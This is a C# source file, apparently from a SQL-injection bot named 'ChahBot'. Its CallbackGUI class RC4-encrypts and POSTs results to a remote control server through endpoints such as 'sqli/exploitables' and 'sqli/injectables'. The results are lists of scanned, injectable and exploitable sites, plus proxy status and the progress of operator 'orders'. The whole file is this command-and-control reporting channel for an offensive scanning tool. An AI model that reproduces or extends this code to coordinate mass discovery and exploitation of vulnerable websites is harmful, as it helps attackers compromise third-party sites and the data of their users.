using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Web.Script.Serialization;

namespace ChahBot_1_0_Gacy
{
    class CallbackGUI
    {
        public bool sendUrls(dynamic Order, Hashtable HashTableUrls)
        {
            var serializer = new JavaScriptSerializer();

            string json = serializer.Serialize(new { order = Order, urls = HashTableUrls.Values });
            string dataCrypted = EncryptionRC4.Encrypt(Config.Config.ENCRYPTION_KEY, json);

            Dictionary<string, string> dataPost = new Dictionary<string, string>();
            dataPost.Add("d", dataCrypted);
            postData(Config.Config.url("sqli/urls"), dataPost);

            return true;
        }

        public bool sendExploitables(dynamic Order, Hashtable HashTableVUlnerables)
        {
            var serializer = new JavaScriptSerializer();

            string json = serializer.Serialize(new { order = Order, exploitables = HashTableVUlnerables.Values });
            string dataCrypted = EncryptionRC4.Encrypt(Config.Config.ENCRYPTION_KEY, json);

            Dictionary<string, string> dataPost = new Dictionary<string, string>();
            dataPost.Add("d", dataCrypted);
            postData(Config.Config.url("sqli/exploitables"), dataPost);

            return true;
        }

        public bool sendInjectables(dynamic Order, Hashtable HashTableInjectables)
        {
            var serializer = new JavaScriptSerializer();

            string json = serializer.Serialize(new { order = Order, injectables = HashTableInjectables.Values });
            string dataCrypted = EncryptionRC4.Encrypt(Config.Config.ENCRYPTION_KEY, json);

            Dictionary<string, string> dataPost = new Dictionary<string, string>();
            dataPost.Add("d", dataCrypted);
            postData(Config.Config.url("sqli/injectables"), dataPost);

            return true;
        }

        public bool sendInjectable(dynamic Order, Dictionary<string, string> site_injectable)
        {
            var serializer = new JavaScriptSerializer();

            string json = serializer.Serialize(new { order = Order, site_injectable });
            string dataCrypted = EncryptionRC4.Encrypt(Config.Config.ENCRYPTION_KEY, json);

            Dictionary<string, string> dataPost = new Dictionary<string, string>();
            dataPost.Add("d", dataCrypted);
            postData(Config.Config.url("sqli/injectable"), dataPost);

            return true;
        }

        public bool sendNonInjectable(dynamic Order, Dictionary<string, string> site_non_injectable)
        {
            var serializer = new JavaScriptSerializer();

            string json = serializer.Serialize(new { order = Order, site_non_injectable });
            string dataCrypted = EncryptionRC4.Encrypt(Config.Config.ENCRYPTION_KEY, json);

            Dictionary<string, string> dataPost = new Dictionary<string, string>();
            dataPost.Add("d", dataCrypted);
            postData(Config.Config.url("sqli/non_injectable"), dataPost);

            return true;
        }

        public bool sendNonInjectable(dynamic Order, Hashtable NonInjectables)
        {
            var serializer = new JavaScriptSerializer();

            string json = serializer.Serialize(new { order = Order, non_injectables = NonInjectables.Values });
            string dataCrypted = EncryptionRC4.Encrypt(Config.Config.ENCRYPTION_KEY, json);

            Dictionary<string, string> dataPost = new Dictionary<string, string>();
            dataPost.Add("d", dataCrypted);
            postData(Config.Config.url("sqli/non_injectables"), dataPost);

            return true;
        }

        public bool sendProxy(dynamic Order, object objProxy)
        {
            var serializer = new JavaScriptSerializer();

            string json = serializer.Serialize(objProxy);
            string dataCrypted = EncryptionRC4.Encrypt(Config.Config.ENCRYPTION_KEY, json);

            Dictionary<string, string> dataPost = new Dictionary<string, string>();
            dataPost.Add("d", dataCrypted);
            postData(Config.Config.url("proxy/add"), dataPost);

            return true;
        }

        public bool sendProxyStatus(dynamic Order, object objProxy)
        {
            var serializer = new JavaScriptSerializer();

            string json = serializer.Serialize(objProxy);
            string dataCrypted = EncryptionRC4.Encrypt(Config.Config.ENCRYPTION_KEY, json);

            Dictionary<string, string> dataPost = new Dictionary<string, string>();
            dataPost.Add("d", dataCrypted);
            postData(Config.Config.url("proxy/set_status"), dataPost);

            return true;
        }

        public bool setStatut(dynamic order, string name, string status)
        {
            var serializer = new JavaScriptSerializer();
            Dictionary<string, string> list = new Dictionary<string, string>();

            list.Add("order_id", order["id"]);
            list.Add("name", name);
            list.Add("status", status);

            postData(Config.Config.url("order/status"), list);

            return true;
        }

        public bool setProgress(dynamic order, int pourcentage)
        {
            var serializer = new JavaScriptSerializer();
            //var output = new List<dynamic>(task);
            var obj = serializer.Serialize(order);
            Dictionary<string, string> list = new Dictionary<string, string>();
            list.Add("order_id", order["id"]);
            list.Add("pourcentage", pourcentage.ToString());

            postData(Config.Config.url("order/progress"), list);

            return true;
        }

        public static string CreateMD5(string input)
        {
            // Use input string to calculate MD5 hash
            using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())
            {
                byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = md5.ComputeHash(inputBytes);

                // Convert the byte array to hexadecimal string
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < hashBytes.Length; i++)
                {
                    sb.Append(hashBytes[i].ToString("X2"));
                }
                return sb.ToString();
            }
        }

        private string postData(string url, Dictionary<string, string> postParameters)
        {
            string postData = "";

            foreach (string key in postParameters.Keys)
            {
                postData += HttpUtility.UrlEncode(key) + "=" + HttpUtility.UrlEncode(postParameters[key]) + "&";
            }
            var data = Encoding.ASCII.GetBytes(postData);

            var request = (HttpWebRequest)WebRequest.Create(url);
            request.UserAgent = Config.Config.MAIN_USER_AGENT;
            request.CookieContainer = new CookieContainer();
            request.AllowAutoRedirect = true;
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = data.Length;
            request.KeepAlive = true;
            request.Headers.Add("Authorization", Config.Config.API_KEY);

            var reponseString = string.Empty;

            for (int t = 0; t < 3; t++)
            {
                try
                {
                    using (var stream = request.GetRequestStream())
                    {
                        stream.Write(data, 0, data.Length);
                    }

                    using (var response = (HttpWebResponse)request.GetResponse())
                    {
                        reponseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                        break;
                    }
                } catch (Exception ex) {
                    throw ex;
                }
            }
            var serializer = new JavaScriptSerializer();
            dynamic json1 = serializer.DeserializeObject(reponseString);
            reponseString = EncryptionRC4.Decrypt(Config.Config.ENCRYPTION_KEY, json1["d"]);
            return reponseString;
        }
    }
}
